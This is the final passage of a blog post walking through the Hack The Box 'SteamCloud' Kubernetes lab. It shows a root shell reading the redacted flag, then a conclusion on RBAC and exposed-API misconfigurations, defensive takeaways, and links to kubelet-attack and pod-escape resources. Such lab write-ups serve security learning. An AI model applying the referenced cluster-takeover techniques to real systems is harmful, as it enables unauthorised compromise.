+</span></span></code></pre></div><h2 id="root-flag-">Root Flag 🚩</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>root@steamcloud:~/root# ls
+</span></span><span style="display:flex;"><span>root.txt
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>root@steamcloud:~/root# cat root.txt
+</span></span><span style="display:flex;"><span>REDECTED_FLAG_VALUE
+</span></span></code></pre></div><h2 id="conclusion">Conclusion</h2>
+<p>Streamcloud is a compact but instructive lab that highlights how small misconfigurations in Kubernetes, like overly permissive service accounts, exposed APIs, or incorrect RBAC rules, quickly turn into full cluster compromise. The lab reinforces that Kubernetes security is a shared responsibility: developers, SREs, and security teams all need to work together to reduce blast radius.</p>
+<h2 id="key-takeaways">Key Takeaways</h2>
+<ul>
+<li>Always apply <strong>least privilege</strong> - avoid granting cluster-admin or wildcard verbs to serviceAccounts.</li>
+<li><strong>Expose only necessary APIs</strong> - kubelet and API server endpoints should be firewall/ACL protected.</li>
+<li><strong>RBAC misconfigurations</strong> are a frequent root cause - regularly review roles, roleBindings, clusterRoles, and clusterRoleBindings.</li>
+</ul>
+<h2 id="references">References</h2>
+<ul>
+<li><a href="https://kubernetes.io/docs/reference/networking/ports-and-protocols/#control-plane">https://kubernetes.io/docs/reference/networking/ports-and-protocols/#control-plane</a></li>
+<li><a href="https://www.cyberark.com/resources/threat-research-blog/using-kubelet-client-to-attack-the-kubernetes-cluster">https://www.cyberark.com/resources/threat-research-blog/using-kubelet-client-to-attack-the-kubernetes-cluster</a></li>
+<li><a href="https://www.covertswarm.com/post/k8s-pod-to-node-escape-techniques">https://www.covertswarm.com/post/k8s-pod-to-node-escape-techniques</a></li>
+<li><a href="https://bishopfox.com/blog/kubernetes-pod-privilege-escalation">https://bishopfox.com/blog/kubernetes-pod-privilege-escalation</a></li>
+<li><a href="https://github.com/cyberark/kubeletctl/">https://github.com/cyberark/kubeletctl/</a></li>
+</ul>
+<h2 id="-connect-with-me">🔗 Connect with me:</h2>
+<ul>
+<li><a href="https://www.linkedin.com/in/bhavik-kanejiya">LinkedIn</a></li>
+<li><a href="https://twitter.com/bhavik_kanejiya">Twitter</a></li>
+<li><a href="https://github.com/bhavik-kanejiya">GitHub</a></li>
+</ul>
+
+            </div>
+        </article>
+
+        <hr />
+
+        <div class="post-info">
+            
+    <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7" y2="7"></line></svg>
+
+        <span class="tag"><a href="https://bhavik-kanejiya.github.io/tags/walkthrough/">Walkthrough</a></span>
+        <span class="tag"><a href="https://bhavik-kanejiya.github.io/tags/htb/">HTB</a></span>
+        <span class="tag"><a href="https://bhavik-kanejiya.github.io/tags/linux/">Linux</a></span>
+        <span class="tag"><a href="https://bhavik-kanejiya.github.io/tags/kubernetes/">Kubernetes</a></span>
+        <span class="tag"><a href="https://bhavik-kanejiya.github.io/tags/pod-breakout/">Pod-Breakout</a></span>
+        
+    </p>
+
+            
+    <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-folder meta-icon"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"></path></svg>
+
+        <span class="tag"><a href="https://bhavik-kanejiya.github.io/categories/htb/">HTB</a></span>
+        <span class="tag"><a href="https://bhavik-kanejiya.github.io/categories/walkthrough/">Walkthrough</a></span>
+        
+    </p>
+
+  		</div>
+    </main>
+
+            </div>
+
+            
+                <footer class="footer">
+    
+    <div class="footer__inner">
+        <div class="footer__content">
+            <span>&copy; 2024</span>
+            <span><a href="https://bhavik-kanejiya.github.io/">Bhavik Kanejiya</a></span>
+            
+            <span><a href="https://bhavik-kanejiya.github.io/posts/index.xml" target="_blank" title="rss"><svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 20 20" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 0 1 9 9"></path><path d="M4 4a16 16 0 0 1 16 16"></path><circle cx="5" cy="19" r="1"></circle></svg></a></span>
+            
+        </div>
+    </div>
+    
+    
+    <div class="footer__inner">
+        <div class="footer__content">
+            <span>Powered by <a href="http://gohugo.io">Hugo</a></span><span>Made with &#10084; by <a href="https://github.com/rhazdon">Djordje Atlialp</a></span>
+        </div>
+    </div>
+    
+</footer>
+
+            
+        </div>
+
+        
+
+
+
+<script type="text/javascript" src="https://bhavik-kanejiya.github.io/bundle.min.ad54ad97364f77ede35def9096b162bb1f0b3973aa50b080f5e82fa147f6882e2a7200d7535adbf9b51bebf939f1c1ca9bbe6be87530092aca720eac4a226fda.js" integrity="sha512-rVStlzZPd&#43;3jXe&#43;QlrFiux8LOXOqULCA9egvoUf2iC4qcgDXU1rb&#43;bUb6/k58cHKm75r6HUwCSrKcg6sSiJv2g=="></script>
+
+
+
+
+    </body>
+</html>
